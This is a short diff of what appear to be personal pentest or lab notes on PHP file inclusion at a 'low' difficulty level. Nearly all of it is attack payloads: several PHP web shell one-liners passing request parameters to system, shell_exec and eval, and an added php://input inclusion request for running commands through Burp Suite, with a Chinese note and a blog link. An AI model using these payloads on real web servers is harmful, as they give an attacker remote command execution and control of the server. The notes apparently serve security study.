@@ -4,6 +4,11 @@ low:
     ?php system($_REQUEST["cmd"]);?>
     reverse-shell-php -->
 
+
+    /fi/?page=php://input&cmd=ls
+    burpsuite request加這個 <?php echo shell_exec($_GET['cmd']);?>
+
+    
     ?php @eval($_POST['a']); ?>
     url:xxx.php?a=XXX
     https://blog.csdn.net/sinat_35058227/article/details/119978861
